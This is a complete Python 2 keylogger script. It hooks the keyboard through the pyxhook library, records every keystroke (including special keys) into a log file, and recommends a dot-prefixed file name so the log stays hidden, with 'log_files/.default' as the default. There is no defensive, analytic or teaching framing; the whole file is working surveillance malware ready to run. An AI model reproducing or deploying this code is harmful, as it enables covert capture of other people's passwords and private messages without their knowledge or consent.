try:
	import sys
	import os
	from pyxhook import *
except Exception, e:
	raise e


try:
	print os.popen("banner welcome\n").read()
except Exception, e:
	raise e
print ' '*10 + '******************************************'
choice = raw_input('Please enter your preference\n if you want a new keylog file say "no" or you want to save in default \n say whatever\n')
if choice == 'no':
	name = raw_input('please enter the file name (better if you add a [dot] before the name: ')
	try:
		ext = raw_input('if you want to give an extension manually')
	except:
		print 'All right, I will take care of it\n'
	if(ext):
		name = name+'.'+ext
	name = 'log_files/'+name
else:
	name = 'log_files/.default'

with open(name,'a+') as lg:
	ts = os.popen('date').read()
	lg.write('\n [time: '+ts+']\n')

class keylogger:
	def __init__(self):
		self.manager = HookManager()
		self.manager.KeyDown = self.main
		self.manager.HookKeyboard()
		self.manager.start()
	def main(self, event):
		k = event.Key
		if k == 'space':
			k = ' '
		elif k == 'Return': k = '\n'
		elif k == 'BackSpace' or k == 'Caps_Lock' or k == 'Tab' or k == 'Delete' or k == 'Escape': k = ' ['+k+'] '
		elif 'Shift'in k or 'Super'in k or 'Control'in k or 'Alt'in k : k = ' ['+k+'] '
		if(event.Ascii == 48):
			self.manager.cancel()
			
		with open(name,'a+') as lg:
			lg.write(k)
new = keylogger()
